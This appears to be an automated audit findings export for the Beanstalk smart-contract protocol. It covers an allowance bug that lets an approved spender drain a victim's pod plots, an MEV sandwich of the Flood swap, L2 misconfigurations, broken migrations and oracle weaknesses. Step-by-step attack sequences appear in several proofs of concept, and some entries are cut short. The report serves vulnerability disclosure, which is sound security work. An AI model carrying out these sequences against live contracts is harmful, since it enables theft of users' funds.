findings.impact: An approved spender (someone the owner granted a FINITE pod allowance via approvePods) can drain ALL of the owner's plots in the active Field (fieldId 0) by calling transferPlots, because the allowance is never decremented and so never runs out. The single-transfer guard would have stopped this; the batch sibling does not. Worst case: full theft of an approving owner's pods up to all plots they hold, far beyond the amount they intended to approve. Secondary impact: for any non-zero fieldId, legitimate delegated batch transfers with a finite allowance always revert (DoS of the batch path on non-default fields).
findings.proof_of_concept:
Group: pod transfer (delegated allowance consumption)
  - transferPlot(sender, recipient, fieldId, index, start, end)  -> decrementAllowancePods(sender, _user(), fieldId, transferAmount)   [CORRECT order]
  - transferPlots(sender, recipient, fieldId, ids, starts, ends) -> decrementAllowancePods(sender, _user(), totalAmount, fieldId)    [fieldId/amount SWAPPED]

Attack (active Field, fieldId = 0):
  1. Victim owner grants attacker a finite pod allowance: approvePods(attacker, 0, X)  where X < victim's total pods.
  2. Attacker calls transferPlots(victim, attacker, 0, ids, starts, ends) selecting pod ranges whose totalAmount >> X.
  3. _transferPlots moves all selected plots from victim to attacker (line 156), no per-call allowance check inside.
  4. Guard branch runs (attacker != victim, allowance != max): decrementAllowancePods(victim, attacker, totalAmount, 0).
     - allowancePods(victim, attacker, totalAmount) = fields[totalAmount].podAllowances[attacker] = 0.
     - require(0 < 0) => false, NO revert.
     - setAllowancePods(victim, attacker, totalAmount, 0 - 0): writes a junk slot; fields[0].podAllowances[attacker] still == X.
  5. Attacker repeats step 2 indefinitely; the real allowance X is never reduced. Attacker steals every plot the victim owns.

Assertable state flip (Foundry): before, fields[0].podAllowances[attacker] == X and victim owns plots P. After transferPlots, victim owns 0 plots, attacker owns P, and fields[0].podAllowances[attacker] is STILL X (proves the allowance was not consumed).

ite.technique: Owner grants approvePods(attacker, 0, X). Attacker calls transferPlots(victim, attacker, 0, ids, starts, ends) (MarketplaceFacet.sol#140); _transferPlots moves the plots at L156, then the allowance guard at L159-164 calls decrementAllowancePods(victim, attacker, totalAmount, fieldId) with fieldId/amount swapped (L163). For fieldId 0 the rewritten check require(0 < 0) is false so it does not revert and the real allowance fields[0].podAllowances[attacker] (=X) is left untouched. Attacker repeats until all victim pods are taken.

The exact gap is the transposed arguments in the batch sibling at L163: the helper reads/writes fields[totalAmount] instead of fields[fieldId] and compares against fieldId instead of the amount, turning a finite approval into an effectively unlimited one on the active field.

findings.title: Flood plenty paid on live roots vs fixed rain.roots divisor
findings.description:
Season-of-Plenty (Flood) rewards are distributed point-in-time, but the per-account root basis and the global divisor are snapshotted at two DIFFERENT points in time, and one of the per-account paths uses LIVE roots instead of the snapshot.

Global divisor: `rewardSop()` computes plentyPerRoot for a well as `amount * SOP_PRECISION / s.sys.rain.roots` (LibFlood.sol#325). `s.sys.rain.roots` is set exactly once, at the season rain STARTS, to `s.sys.silo.roots` (LibFlood.sol#74 in `handleRain`), and is never refreshed for the duration of the rain. Conservation therefore requires that the sum over all accounts of (root-basis used to pay that account) equals `rain.roots`.

Per-account basis: an account's plenty is credited in `handleRainAndSops()` -> `balanceOfPlenty()` (LibFlood.sol#115, #147). `balanceOfPlenty` has two payout branches:
  (a) the rain branch (LibFlood.sol#154-171), which correctly multiplies plentyPerRoot by the SNAPSHOT `s.accts[account].sop.rainRoots`;
  (b) the fallback branch (LibFlood.sol#178-181) `if (s.sys.season.lastSop > s.accts[account].lastUpdate) { plenty += (sops[lastSop]-previousPPR) * s.accts[account].roots / SOP_PRECISION; }` which multiplies by the account's LIVE current roots `s.accts[account].roots`.

Which account hits which branch is decided by the strict inequality in `handleRainAndSops` at LibFlood.sol#124: `if (s.sys.season.rainStart > lastUpdate)` snapshots `rainRoots = s.accts[account].roots` and sets `lastRain`. An account whose `lastUpdate == rainStart` (i.e. it mowed/interacted during the very season rain started) does NOT satisfy `rainStart > lastUpdate`, so it never captures `rainRoots` and never sets `lastRain` for this rain. When a Flood (SOP) then occurs in a later season of the same rain, that account's plenty is computed through fallback branch (b) on its LIVE roots, not on a rain-start snapshot.

Because roots grow over seasons (every `__mow` calls `mintActiveStalk`, LibSilo.sol#475/#180, which increases `s.accts[account].roots`), an account that was active at rain start and keeps mowing accrues more roots between rain start and the SOP. Its plenty is then paid on the inflated live root count while the divisor `rain.roots` reflects the smaller rain-start total. The fixed `plentyPerSopToken` pool (LibFlood.sol#331) is thereby over-allocated to these accounts, diluting accounts that were snapshotted via the correct `rainRoots` path. The two root bases (live vs snapshot) are mutually inconsistent against a single fixed divisor, so total credited plenty can exceed the tokens actually obtained in the sop swap, leaving some honest claimers unable to withdraw their full share (claimPlenty/claimAllPlenty draw from the shared `plentyPerSopToken[token]` balance).
findings.impact: Flood (Season-of-Plenty) WETH/non-bean proceeds are mis-distributed. Accounts that were active at rain start (lastUpdate == rainStart) are paid plenty proportional to their LIVE, season-grown roots rather than their rain-start roots, while the global divisor rain.roots is the rain-start total. This over-credits those accounts and dilutes honest Stalkholders whose plenty is correctly computed from the rainRoots snapshot; in aggregate the credited plenty can exceed the tokens received from the sop sale, so the last claimers' claimPlenty/claimAllPlenty can revert or under-pay. The mis-accounting is permissionless and arises from normal silo use (mowing every season) during a rain.

1. Season R: rain begins (handleRain sets s.sys.rain.roots = silo.roots, e.g. 1000; raining=true).

findings.title: EIP-712 domain hardcodes chainId=1, breaking Diamond permits/Tractor on L2
findings.description: Beanstalk builds three independent EIP-712 domain separators inside the Diamond — LibSiloPermit (Silo Deposit permits), LibTokenPermit (farm-balance ERC20 permits), and LibTractor (Tractor blueprint signing). All three build the domain separator with `C.getChainId()` instead of the runtime `block.chainid`. `C.getChainId()` returns the constant `CHAIN_ID = 1` hardcoded in C.sol (line 22). EIP-712 requires the domain separator's `chainId` field to equal the chain the contract is actually executing on. The protocol is being redeployed to an L2 whose chainId is NOT 1 (e.g. Arbitrum 42161, Base 8453, Optimism 10). Every off-chain signer that follows EIP-712 correctly — MetaMask, ethers/viem `signTypedData`, and the Beanstalk SDK — will populate the domain `chainId` with the L2's real chainId. The on-chain verifier recomputes the digest with chainId=1, so `ECDSA.recover` returns an address that does not equal `owner`, and every permit/blueprint reverts with 'permit invalid signature'. Result: permit-based deposit approvals (ApprovalFacet.permitDeposit / permitDeposits), farm-balance ERC20 permits (TokenFacet.permitToken via TokenSupportFacet), and the entire Tractor blueprint/requisition system are non-functional on the L2 deployment. There is no on-chain setter to fix the constant; it would require a code upgrade. (Note: cross-chain replay against L1 Beanstalk is NOT possible because the domain also encodes `address(this)` and the L2 Diamond has a different address — the impact is functionality breakage / signature DoS, not replay.)

location.code_snippet: uint256 private constant CHAIN_ID = 1;  // used by LibSiloPermit._buildDomainSeparator (LibSiloPermit.sol:164), LibTokenPermit._buildDomainSeparator (LibTokenPermit.sol:82), LibTractor._domainSeparatorV4 (LibTractor.sol:180)

findings.impact: On the L2 redeployment, every Silo Deposit permit, farm-balance ERC20 permit, and Tractor blueprint/requisition signature fails verification (signer != owner). Permit-based UX and the entire Tractor automation subsystem are bricked until a contract upgrade re-points the chainId. Standard-compliant wallets cannot produce a signature that the contract will accept.
findings.proof_of_concept: 1. Deploy Beanstalk Diamond to an L2 with block.chainid = 42161. 2. User signs a SiloDeposit permit with their wallet; the wallet uses domain {name:'SiloDeposit', version:'1', chainId:42161, verifyingContract: diamond}. 3. Submit ApprovalFacet.permitDeposit(owner, spender, token, value, deadline, v, r, s). 4. LibSiloPermit.permit -> _hashTypedDataV4 -> _domainSeparatorV4 -> _buildDomainSeparator encodes chainId = C.getChainId() = 1 (NOT 42161). 5. ECDSA.recover(hash, v, r, s) returns an address != owner. 6. require(signer == owner) reverts 'Silo: permit invalid signature'. Identical failure for LibTokenPermit.permit and any Tractor blueprint verified via LibTractor._domainSeparatorV4.
findings.recommendation: Replace the hardcoded `C.getChainId()` in all three domain-separator builders with the runtime opcode `block.chainid`, and follow the OpenZeppelin EIP712 pattern of caching the separator while re-deriving it whenever `block.chainid` changes (protects against L2 forks). Do not rely on a compile-time constant for chainId in any EIP-712 domain. Verify L2ContractMigrationFacet's use of `C.getLegacyChainId()` (=1) is intentional, since that signature is meant to be produced on L1.

findings.title: Hardcoded mainnet WETH address bricks wrapEth/unwrapEth on L2
findings.description: Both the active TokenFacet WETH wrapper (libraries/Token/LibWeth.sol) and the migration L1TokenFacet wrapper (beanstalk/migration/L1Libraries/LibWeth.sol) hardcode the Ethereum mainnet WETH9 address `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2` as a `constant` (line 16 in each). The same value is the `C.WETH` constant in C.sol (line 64). TokenFacet imports the active Token/LibWeth and exposes wrapEth/unwrapEth guarded by `oneOutFlow(C.WETH)` (TokenFacet.sol:236). On the L2 target, the canonical WETH contract lives at a completely different address (Arbitrum 0x82aF...; Base 0x4200...0006; Optimism 0x4200...0006). On L2, `IWETH(WETH).deposit{value: amount}()` and `IWETH(WETH).withdraw(amount)` call code at the mainnet address — which on the L2 is either non-existent (call to an account with no code -> low-level call returns, but the contract has no fallback minting WETH, so the user pays ETH and receives nothing / interface call reverts) or, worse, an unrelated contract. ETH sent to a wrong/empty address during wrap is lost or trapped, and unwrap's subsequent `balanceOf`/`withdraw` accounting on the wrong token is meaningless.

findings.title: LibWell USD/bean-price math hardcodes 18-decimal non-Bean token assumption
findings.description:
Several LibWell helpers scale Well reserves with hardcoded 1e18 / 1e6 factors that are only correct when the non-Bean token has 18 decimals. The functions even document the assumption ('assumes TKN has 18 decimals', LibWell.sol#178 and #216) but nothing enforces it on whitelist.

  - getWellTwaUsdLiquidityFromReserves (LibWell.sol#134-155): for the in-season path it returns twaReserves[j].mul(1e18).div(tokenUsd) where tokenUsd is a 6-decimal USD/TKN price and twaReserves[j] is the non-Bean reserve in its NATIVE decimals. The 1e18 numerator presumes the reserve is 1e18-scaled. For the out-of-season path it returns LibUsdOracle.getTokenPrice(token).mul(twaReserves[j]).div(1e6) — again assuming the reserve carries 18 decimals so the result lands at 1e18 USD precision.
  - getBeanTokenPriceFromTwaReserves (LibWell.sol#241-259): price = reserveBean.mul(1e18).div(reserveTkn) (or the inverse). The fixed 1e18 only yields a correctly-scaled TKN/BEAN price when Bean (6 dec) is paired against an 18-dec token; a 6-dec or 8-dec non-Bean token shifts the result by 10**(18-decimals).

These values are consumed by LibEvaluate.calcLPToSupplyRatio (usdLiquidity at LibEvaluate.sol#260, drives the L2SR weather case) and LibEvaluate.evalPrice (beanUsdPrice = 1e30 / (usdTokenPrice * beanTknPrice), LibEvaluate.sol#111-113, drives the excessive-price case 6). A non-18-decimal token would make usdLiquidity and beanUsdPrice wrong by a factor of 10**(18-decimals), pushing the L2SR/price weather cases into the wrong bucket and mis-sizing the season's stalk/soil/temperature response. This is a latent decimal-mismatch bug: currently inert because the live Wells use WETH/wstETH (both 18-dec), but it is triggered the moment governance whitelists a Well with a 6- or 8-decimal non-Bean token (e.g. USDC, WBTC).
findings.impact: If a Well with a non-18-decimal non-Bean token is whitelisted, the computed USD liquidity and Bean USD price are off by 10**(18-decimals). This corrupts the liquidity-to-supply ratio and the excessive-price detection in LibEvaluate, selecting the wrong Weather caseId and therefore mis-issuing grown stalk, soil, and temperature changes for that Season — a systematic accounting distortion of core monetary policy rather than a direct single-tx drain.
findings.recommendation: Normalize reserves to a common precision using the token's actual decimals (e.g. multiply by 10**(18 - IERC20Decimals(token).decimals())) before applying the 1e18 scaling, or enforce on whitelist (LibFertilizer.beginBarnRaiseMigration / whitelist path) that the non-Bean token has exactly 18 decimals and revert otherwise. Replace the hardcoded 1e18/1e6 constants in getWellTwaUsdLiquidityFromReserves and getBeanTokenPriceFromTwaReserves with decimal-aware scaling.

The 10**(18-decimals) scale error flows into evalLpToSupplyRatio/evalPrice caseId selection and thus into LibGauge stalk/soil sizing.

findings.description: Two behavioral divergences in the same redemption routine. (1) Name/intent vs implementation: the function is named redeemDepositsAndInternalBalances and its @notice promises redemption of 'deposits and bean-asset internal balances'; the AccountInternalBalance[] internalBalances array is even committed into and validated by the Merkle leaf (verifyDepositsAndInternalBalances, #127-128). But the function body never credits internal balances anywhere — there is no write to s.accts[reciever].internalTokenBalance. Migrating contracts that present (and prove) internal balances have those balances silently dropped. (2) Cross-step global-state drift: addMigratedDepositsToAccount declares local `uint128 totalDeposited; uint128 totalDepositedBdv;` (#159-160) that are never incremented, then writes them to the GLOBAL aggregates `s.sys.silo.balances[token].deposited = totalDeposited;` and `.depositedBdv = totalDepositedBdv;` (#194-195) — i.e. it assigns 0, and uses `=` rather than `+=`. Any contract redemption therefore overwrites the global deposited/depositedBdv totals (set earlier by ReseedSilo) to 0 for that token, while the per-account deposit mappings remain populated. This makes the per-account deposits and the global silo balance permanently inconsistent across the migration lifecycle.

findings.title: L1 burns Beans but L2 receiver always reverts (EXTERNAL_L1_BEANS=0)
findings.description: The external-Bean L1->L2 migration is a two-sided cross-chain flow. On L1, BeanL2MigrationFacet.migrateL2Beans() (L43) irreversibly burns the user's Beans (C.bean().burnFrom(msg.sender, amount), L49) and then sends a cross-chain message instructing the L2 to mint the same amount to `reciever`. On L2, BeanL1RecieverFacet.recieveL1Beans() (L31) is the receiver. It increments s.sys.migration.migratedL1Beans by `amount` and then enforces `require(EXTERNAL_L1_BEANS >= s.sys.migration.migratedL1Beans, "L2Migration: exceeds maximum migrated")`. EXTERNAL_L1_BEANS is declared `uint256 constant EXTERNAL_L1_BEANS = 0;` (L22) with NO setter anywhere in scope. Therefore for any amount > 0 the require evaluates `0 >= amount` which is false, and the L2 mint reverts. The L1 burn has already succeeded and is irreversible. Result: a cross-chain accounting asymmetry where the source side destroys value but the destination side categorically refuses to credit it, stranding the migrated Beans. The BRIDGE addresses themselves are consistent with an Optimism/Base-stack deployment (L1 messenger 0x866E...0Afa, L2 CrossDomainMessenger predeploy 0x4200...0007) and xDomainMessageSender is checked against L1BEANSTALK, so the gate that fails is the supply cap, not the messenger auth.
findings.impact: Any user who migrates external Beans loses them: Beans are burned on L1 (irreversible) while the corresponding mint on L2 reverts for every nonzero amount because the hardcoded supply cap is 0. The cross-chain message cannot succeed, so funds are stranded with no recovery path in scope.
findings.proof_of_concept: 1) User calls BeanL2MigrationFacet.migrateL2Beans(reciever, L2Beanstalk, amount>0, gasLimit) on L1 -> burnFrom destroys `amount` Beans, message dispatched. 2) Relayer delivers the message to L2 BeanL1RecieverFacet.recieveL1Beans; messenger auth passes; migratedL1Beans becomes `amount`; require(0 >= amount) is false -> revert. 3) Mint never occurs; the L1 burn is permanent. findings.title: Flood SOP swap uses minAmountOut=0 and max deadline, sandwichable by MEV bots
findings.description: During a Flood (Season of Plenty), sopWell() mints Beans and dumps them on the SOP Well via IWell.swapFrom(C.bean(), sopToken, sopBeans, 0, address(this), type(uint256).max) (LibFlood.sol L299-306). The minAmountOut is hard-coded to 0 and the deadline to type(uint256).max. The amount of non-Bean token (e.g. WETH) received from this forced sale is exactly what is distributed to Stalkholders as 'plenty' (rewardSop L320-332 increments plentyPerSopToken and the per-root accumulator). Because the swap accepts any output amount, an MEV searcher can sandwich the protocol's own flood swap: buy the non-Bean token / skew the Well right before sunrise()->stepSun()->handleRain()->sopWell(), let Beanstalk sell its freshly minted Beans into the worsened price (receiving fewer WETH), then unwind. The deficit comes straight out of the WETH distributed to Stalkholders. The flood swap is triggered inside the permissionless sunrise()/gm() season step, so the searcher knows precisely when it will fire (it is bundled in the same block as the sunrise transaction the searcher can themselves submit).
findings.impact: MEV extraction of Season-of-Plenty proceeds: Stalkholders receive less WETH 'plenty' than the fair-market value of the Beans sold, with the difference captured by a sandwicher. The size scales with the flood's deltaB (can be large during a strong over-peg Flood).

1. Conditions ripen for a Flood (Oversaturated, P>1, pod rate <5% for >=1 season).
2. Searcher constructs a bundle: (a) skew the SOP Well's reserves so Beans buy less WETH, (b) call sunrise()/gm() which runs handleRain->sopWell, dumping minted Beans with minAmountOut=0 into the worsened pool and receiving a reduced amountOut, (c) reverse the skew to recover their capital plus the extracted spread.

findings.title: Hardcoded mainnet oracle and token addresses break price feeds on L2
findings.description: LibUsdOracle and LibWstethEthOracle resolve prices using hardcoded mainnet addresses from C.sol: the Chainlink registry `chainlinkRegistry = 0x47Fb2585...` (LibUsdOracle.sol:36), the ETH/USD, wstETH/ETH, USDC/USD and USDT/USD Chainlink aggregators (C.sol:79-84), the wstETH/ETH Uniswap V3 0.01% pool (C.sol:87), and token-address branch comparisons against `C.WETH` / `C.WSTETH` (LibUsdOracle.sol:50,55,78,83 and LibWstethEthOracle.sol:76,85,86). On the L2 these aggregator/pool/registry addresses point to contracts that do not exist or are unrelated, and the token-identity comparisons (`if (token == C.WETH)`) will never match the L2's real WETH/wstETH tokens — so the oracle either reverts (call to non-contract / Chainlink registry missing the feed) or silently falls through to a wrong branch and returns an incorrect or zero price. Because USD pricing feeds Fertilizer minting (LibUsdOracle is used by FertilizerFacet via getBarnRaiseToken pricing) and Silo BDV/deltaB logic, a wrong/stale/zero price corrupts mint amounts and convert penalties. This is reported separately from the EIP-712 issue because the failure surface is the price layer, but it is the same root cause class: mainnet-only constants in C.sol used unchanged on L2.

findings.title: Fertilizer ERC1155 safe-mint acceptance check can brick mintFertilizer
findings.description: Fertilizer1155._safeMint (Fertilizer1155.sol:79-89) always runs __doSafeTransferAcceptanceCheck on mint, which — when the recipient is a contract — calls `IERC1155Receiver(to).onERC1155Received(...)` and reverts the whole mint if the receiver returns a non-magic value or reverts (lines 95-116). beanstalkMint (Fertilizer.sol:47-60) is invoked by FertilizerFacet.mintFertilizer (FertilizerFacet.sol:85) with recipient `LibTractor._user()`. A smart-contract account (Safe, abstract-account wallet, or any contract that bought through the Barn Raise) that does not implement onERC1155Received will cause its OWN mintFertilizer call to revert after the LP/recapitalization side effects in addFertilizer have begun — making it impossible for such accounts to buy Fertilizer. Because Beanstalk increasingly targets contract/AA users on L2 and the Tractor system lets operators act on behalf of publishers, this is a realistic griefing/DoS surface for contract buyers, not merely self-inflicted. The acceptance check is correct per the ERC-1155 spec, but combined with a single-shot mint-and-recapitalize flow it converts an unsupported-receiver into a hard buy failure. This is the only Fertilizer ERC1155 correctness item found: the TransferSingle/TransferBatch event operator/from/to ordering (Fertilizer1155.sol:45,72,86) is spec-correct, and safeTransferFrom/safeBatchTransferFrom auth checks are present.

location.code_snippet: function _safeMint(...) { ... __doSafeTransferAcceptanceCheck(operator, address(0), to, id, amount, data); }  // reverts mint if `to` is a contract without IERC1155Receiver

findings.impact: Smart-contract accounts (Safes, AA wallets) that do not implement IERC1155Receiver cannot purchase Fertilizer — mintFertilizer reverts for them. On an L2 with heavy AA usage this denies a core protocol action to a class of users and can grief Tractor-operated purchases on behalf of contract publishers.

C.fertilizer().beanstalkMint(user=multisig, ...) -> _safeMint -> __doSafeTransferAcceptanceCheck -> IERC1155Receiver(multisig).onERC1155Received reverts (no such function / fallback reverts). 4. Entire mintFertilizer transaction reverts; the contract account can never buy Fertilizer.
findings.recommendation: Either document that Fertilizer recipients MUST implement IERC1155Receiver, or relax the mint path to not enforce the acceptance check on mint to non-receiver contracts (e.g. mint without the callback, mirroring how some protocols separate mint from safeTransfer), or expose a buy-for-EOA path. Confirm that all integration constants used in the same flow (BEAN_WSTETH_WELL is `// TODO: Set` in C.sol:73) are finalized before L2 deployment to avoid a separate addFertilizer revert.

findings.title: LibTractor domain separator uses BLUEPRINT_TYPE_HASH not EIP712Domain typehash
findings.description: LibTractor._domainSeparatorV4() (LibTractor.sol#173-184) builds the EIP-712 domain separator with BLUEPRINT_TYPE_HASH as its first encoded field instead of the EIP712Domain typehash (the file defines EIP712_TYPE_HASH at L24-27 but never uses it). The separator is internally consistent — the same (wrong) value is used both when the contract computes _getBlueprintHash for verification and there is no second producer on-chain — so signatures created via getBlueprintHash() still verify and CANNOT be forged; this is not an on-chain auth bypass. The defect is EIP-712 non-compliance: a standard wallet signing the Tractor typed data via eth_signTypedData computes the correct EIP712Domain-based separator, producing a signature that FAILS verifyRequisition (TractorFacet.sol#32-41). Conversely the sibling L2ContractMigrationFacet._domainSeparatorV4 (L230-241) correctly uses EIP712_TYPE_HASH, confirming this is an unintended inconsistency in LibTractor.

location.code_snippet: return keccak256(abi.encode(BLUEPRINT_TYPE_HASH, TRACTOR_HASHED_NAME, TRACTOR_HASHED_VERSION, C.getChainId(), address(this)));  // should be EIP712_TYPE_HASH

findings.impact: Blueprints signed with standard EIP-712 tooling are rejected (operational/integration breakage); no signature forgery or fund loss. Off-chain signers must replicate the non-standard separator to interoperate with TractorFacet.
findings.recommendation: Replace BLUEPRINT_TYPE_HASH with EIP712_TYPE_HASH in _domainSeparatorV4() so the domain separator matches the EIP-712 spec and standard wallet signing.

findings.title: UnwrapAndSendETH sweeps full WETH balance to any caller-supplied address
findings.description: UnwrapAndSendETH.unwrapAndSendETH(address to) (UnwrapAndSendETH.sol#26-32) is an unguarded external function that unwraps the contract's ENTIRE WETH balance and forwards address(this).balance to a fully caller-supplied `to` (L30, slither arbitrary-send-eth). This is a standalone pipeline junction, not a Beanstalk facet and not delegatecalled by the diamond, so it never holds Beanstalk protocol funds and is designed to be used atomically inside a single pipe with no resting balance. The residual risk is purely junction-local: any WETH transiently left in the junction between pipe calls (e.g. a user who funds it but reverts before sweeping, or an over-funded pipe) is claimable by any account that calls unwrapAndSendETH(attacker) first. No diamond ETH or approvals are reachable through this path.

location.code_snippet: uint256 wethBalance = IWETH(WETH).balanceOf(address(this)); ... IWETH(WETH).withdraw(wethBalance); (bool success, ) = to.call{value: address(this).balance}(new bytes(0));

findings.impact: Any WETH/ETH left resting in the UnwrapAndSendETH junction outside an atomic pipe can be stolen by any caller. No effect on Beanstalk diamond balances or user approvals to the diamond.
findings.recommendation: Document the no-resting-balance assumption explicitly; for defense-in-depth, restrict the sweep to amounts/recipients tied to the active pipe context or require the junction to be entered only via Pipeline within the same call frame.

findings.title: SOP per-account rainRoots snapshot may diverge from global rain.roots divisor
findings.description: Season-of-Plenty rewards are distributed pro-rata using two snapshots that are taken at different times. The global divisor s.sys.rain.roots is set once, synchronously, when rain starts: handleRain() (LibFlood L72-74) does s.sys.rain.roots = s.sys.silo.roots inside calcCaseIdandUpdate (Weather L97), which runs BEFORE LibGerminate.endTotalGermination (SeasonFacet L57). The per-account numerator s.accts[account].sop.rainRoots is captured LAZILY, the first time each account mows during the rain: handleRainAndSops (LibFlood L124-127) sets rainRoots = s.accts[account].roots, and inside _mow this also runs before endAccountGermination (LibSilo L438 vs L444). rewardSop divides minted plenty by s.sys.rain.roots (L325) while balanceOfPlenty multiplies each account's claim by rainRoots (L169). The design relies on the invariant sum(account.rainRoots) == s.sys.rain.roots. Because rainRoots is a per-account snapshot that is NOT decremented on withdraw/transfer during the rain and is captured at a per-account time that differs from the global snapshot, there are plausible boundary cases (e.g. roots that finish germinating exactly at the rain boundary, or deposit/withdraw/transfer sequences across the rain start) where the sum of account rainRoots does not equal rain.roots. If the sum exceeds rain.roots, total claimable plenty exceeds the WETH actually received in rewardSop, leading to claim shortfall for the last claimers (DoS) or, combined with plentyPerSopToken accounting, protocol token imbalance. I traced the snapshot ordering and confirmed the two snapshots are taken at structurally different points, but could not construct a concrete sequence that makes sum(rainRoots) > rain.roots with the germination ordering as written; the residual risk is in multi-season germination/transfer boundary conditions.
findings.impact: If the sum of per-account rainRoots can exceed the global rain.roots divisor, SOP plenty is over-allocated: late claimers cannot withdraw their full plenty (claimPlenty reverts on the plentyPerSopToken subtraction / token transfer), a griefing/DoS on reward claims and a potential accounting mismatch. Severity is held at Low pending a concrete divergence sequence.
findings.proof_of_concept: Hypothesis (not fully constructed): At rain start in season N, rain.roots is snapshotted before endTotalGermination adds the season's germinated roots to silo.roots. An account whose germinating stalk completes at season N and which had not mowed since before N captures rainRoots = its roots at its later mow. Whether that capture happens before or after its own germinated roots are added (and whether other accounts' lazily captured rainRoots collectively overshoot rain.roots) determines exploitability. Requires a Foundry harness stepping multiple seasons with germination + rain to confirm.
findings.recommendation: Capture rain.roots and every account's rainRoots from the SAME post-germination snapshot, or recompute rainRoots from a fully-germinated roots value, and assert sum(account.rainRoots) <= rain.roots as an invariant. Add an explicit test that the total plenty distributed (sum over accounts of plentyPerRoot*rainRoots/SOP_PRECISION) never exceeds the WETH received in rewardSop.
findings.human_review_reason: Multi-block / multi-season time-based accounting with germination boundary conditions (an explicit human-escalation category). The snapshot-timing divergence is real but a concrete sum(rainRoots) > rain.roots sequence was not confirmed; needs a multi-season Foundry PoC and human review.

findings.title: Chainlink getTwap aborts to 0 if any historical round is unavailable
findings.description: LibChainlinkOracle.getTwap walks backwards through Chainlink rounds (roundId -= 1, line 140) accumulating a cumulative price until a round at least `lookback` seconds old is reached. getRoundData returns (-1, 0) on any failed round read (line 178), and checkForInvalidTimestampOrAnswer treats a 0 timestamp or non-positive answer as invalid (lines 188-194), causing getTwap to return 0 for the entire window (line 151). A single missing/stale historical round (e.g. a phase transition where the predecessor roundId belongs to a prior aggregator phase, or a gap in round IDs) therefore collapses the whole TWAP to 0 rather than skipping that round. Because the broader oracle stack treats a 0 price as 'oracle off' (LibWellMinting.twaDeltaB returns deltaB 0 / success=false; LibUsdOracle returns 0), this degrades to the minting oracle silently turning off rather than direct fund loss, but it makes the TWAP path fragile precisely when it is most needed (volatile periods with rapid round turnover). Note also that decrementing the uint80 roundId across a Chainlink phase boundary does not move to the previous phase's last round, so the lookup will fail at the boundary.
findings.impact: A single unavailable or phase-boundary historical round forces the Chainlink TWAP to return 0, which the consuming oracle interprets as a feed failure and turns the minting oracle / USD price off for that read. This is a graceful-degradation/availability weakness (deltaB and barn-raise pricing become unavailable, not wrong), not a direct theft, but it can be triggered by ordinary Chainlink phase transitions.
findings.proof_of_concept: Configure a feed whose latest round sits shortly after an aggregator phase upgrade so that roundId-1 belongs to the prior phase (different phaseId high bits). Call any path that reaches getTwap with lookback spanning the boundary: getRoundData(roundId-1) reverts/returns (-1,0), checkForInvalidTimestampOrAnswer returns true, and getTwap returns 0 — even though a valid average over the window exists.
findings.recommendation: Skip (continue to the next earlier round) rather than aborting on an individual failed round, and reconstruct the previous Chainlink phase's terminal roundId when crossing a phase boundary (decode phaseId/aggregatorRoundId from the packed roundId) instead of a naive `roundId -= 1`. Alternatively, bound the loop and fall back to the last good instantaneous price with an explicit staleness check.

findings.title: totalDeltaB() getter sums only BEAN_ETH_WELL, not all minting wells
findings.description: SeasonGettersFacet.totalDeltaB() is documented as 'Returns the total Delta B across all whitelisted minting liquidity Wells' but its body computes deltaB = LibWellMinting.check(C.BEAN_ETH_WELL) — a single hardcoded well. The protocol's actual season-minting path, Oracle.stepOracle() (Oracle.sol#21-27), instead iterates LibWhitelistedTokens.getWhitelistedWellLpTokens() and accumulates LibWellMinting.capture() over EVERY whitelisted well: `for (i) deltaB = deltaB.add(LibWellMinting.capture(tokens[i]))`. LibDeltaB.overallCurrentDeltaB() (LibDeltaB.sol#54-60) likewise sums all wells. The protocol is explicitly multi-well: both C.BEAN_ETH_WELL and C.BEAN_WSTETH_WELL are migrated/whitelisted (ReseedL2Migration.sol#35-40, mock inits set isWhitelistedWell + stalkEarnedPerSeason for BEAN_WSTETH). Therefore once BEAN_WSTETH (or any second well) holds liquidity, the value returned by totalDeltaB() is NOT the protocol's aggregate peg deviation — it omits every well except BEAN_ETH. The function name and NatSpec assert an aggregate ('total ... across all') that the implementation does not deliver. This is a behavioral/semantic divergence between the documented protocol-level invariant (this getter reports the figure that drives mint/burn) and the actual code.
findings.impact: Off-chain consumers, dashboards, keeper/MEV bots, and any integrating contract that reads totalDeltaB() to gauge whether Beanstalk is above or below peg receive a value that ignores all non-BEAN_ETH wells. In a multi-well deployment this can report the protocol at peg (or above) when the true aggregate deltaB (the quantity that stepSun mints/burns on) is materially different, leading to mispriced soil/pod decisions by integrators and misreporting of protocol solvency state. No on-chain Beanstalk consumer of totalDeltaB() was found (stepOracle recomputes the correct sum independently for minting), so there is no direct fund loss inside Beanstalk; the impact is incorrect public protocol state reporting and downstream integrator/keeper miscalculation. Severity is capped at Low because the minting math itself is unaffected and no trusted on-chain consumer reads this getter.

findings.title: Diamond<->Fertilizer callback loop unguarded by shared nonReentrant lock
findings.description: The Beanstalk diamond and the external Fertilizer (ERC-1155) contract form a cross-contract callback loop, and none of the diamond-side participants carry nonReentrant. claimFertilized (FertilizerFacet.sol#47-54) calls C.fertilizer().beanstalkUpdate(...), which inside Fertilizer._update (Fertilizer.sol#75-78) calls back into the diamond via IBS(owner()).payFertilizer(account, amount) (FertilizerFacet.sol#96-103). Separately, any holder can call Fertilizer1155.safeTransferFrom directly (Fertilizer1155.sol#19, a public function on the standalone Fertilizer contract, so the diamond's reentrant lock is NOT engaged when entering it); its _beforeTokenTransfer (Fertilizer.sol#62-73) calls _update -> payFertilizer for both from and to BEFORE _transfer moves the 1155 balance, and the recipient onERC1155Received hook (Fertilizer1155.sol#104) fires AFTER _transfer. I traced both directions and did NOT find a double-payout: __update updates _balances[id][account].lastBpf (Fertilizer.sol#90) before computing further deltaBpf, so a second pass yields deltaBpf=0; and payFertilizer sends Beans only To.INTERNAL (no external call, no hook). In mintFertilizer the 1155 mint (which triggers onERC1155Received) is the LAST action after all diamond state is finalized. Thus no concrete over-claim is currently reachable. The residual concern is structural: the cross-contract round trip is unguarded by any shared lock, so its safety depends on the precise effects-before-callback ordering inside Fertilizer staying correct across future changes, and on the onERC1155Received hook never being able to re-enter a diamond fund-mover mid-update. Reported Low.
findings.impact: No current over-claim of rinsable Beans: lastBpf is updated before payout (deltaBpf=0 on re-pass) and payFertilizer uses To.INTERNAL with no external call. The hazard is a structurally unguarded diamond<->Fertilizer callback loop that relies on effects-before-interaction ordering remaining correct; a future change that moves a fund effect after the payFertilizer/onERC1155Received callback would become exploitable with no reentrancy lock to catch it.
